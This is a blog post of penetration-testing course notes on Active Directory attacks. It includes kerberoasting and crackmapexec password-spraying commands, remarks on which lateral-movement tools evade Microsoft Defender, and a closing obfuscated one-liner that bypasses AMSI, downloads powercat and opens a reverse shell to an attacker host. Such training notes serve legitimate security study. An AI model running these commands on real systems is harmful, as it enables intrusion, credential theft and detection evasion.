---
title: 'OffSec Live: PEN-200'
date: 2022-08-26 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2022-08-26-offsec-live-pen-200.html
author: 100007
---

# Active Directory Enumeration & Exploitation, Part 2

`Get-DomainUsers -SPN` will list AD service accounts using `PowerView.ps1`.

In AD, the domain controller will grant a service ticket for _any_ service to _any_ user. Access is enforced by the _service_ machine.

Since AD tickets are encrypted using account password hashes - so if weak passwords are chosen for service accounts, tickets can be cracked to retrieve service account passwords.

There is an `Invoke-Kerberos.ps1` PowerShell module out there that does native kerberoasting from PowerShell. Output can be passed to Hashcat, among others. Be sure to set the `-Width` parameter (vixx recommends 8000) when using `Out-File` with this module, or this function won’t output the entire ticket!

```
Invoke-Kerberoast -OutputFormat Hashcat |
	Select-Object Hash |
	Out-File -filepath "$FILE_PATH" -Width 8000
```

SSH port forwarding is actually using SOCKS5 under the hood. This is important to know when setting up tools like `proxychains`.

There’s a tool called `crackmapexec` that allows cracked passwords to be sprayed across an AD environment (available in the Kali repos). Since SMB shares are both common and often contain interesting files, this is a good service to try to gain (indiscriminate) access to. (Note that you _shouldn’t_ use password spraying to try to crack user passwords, as doing so will likely lead to account lockouts and subsequent alarms. Instead, use spraying to determine user access.)

```
crackmapexec smb $TARGET_NETWORK/$TARGET_NETMASK \
	-u $TARGER_USER -p $CRACKED_PASSWORD 2> /dev/null
```

Microsoft Defender now detects ImPacket PSEXEC and SMBEXEC execution attempts.

The SCShell fileless lateral movement tool is generally _not_ detected by Microsoft Defender (at least as of this course). It does require RPC to be available on the target, though this is common in AD environments.

Powercat is a reimplementation of netcat in PowerShell. Helpful!

A one-liner to bypass AMSI and fire up a PowerShell reverse shell using Powercat:

```
[REF].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true); IEX (New-Object System.Net.Webclient).DownloadString("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1"); powercat -c $ATTACKER_IP -p $ATTACKER_PORT -e cmd.exe
```

- [OffSec Live](https://www.offensive-security.com/offsec/offsec-live/)
- [Join OffSec Live](https://learn.offensive-security.com/offsec-live-webinars)
- [PowerShellMafia / PowerSploit / Recon / PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [Using PowerShell](https://cardboard-iguana.com/notes/powershell.html)
- [EmpireProject / Empire / module\_source / credentials / Invoke-Kerberoast.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
- [Kerberos](https://cardboard-iguana.com/notes/kerberos.html)
- [Using Hashcat](https://cardboard-iguana.com/notes/hashcat.html)
- [Mr-Un1k0d3r / SCShell](https://github.com/Mr-Un1k0d3r/SCShell)
- [besimorhino / powercat](https://github.com/besimorhino/powercat)
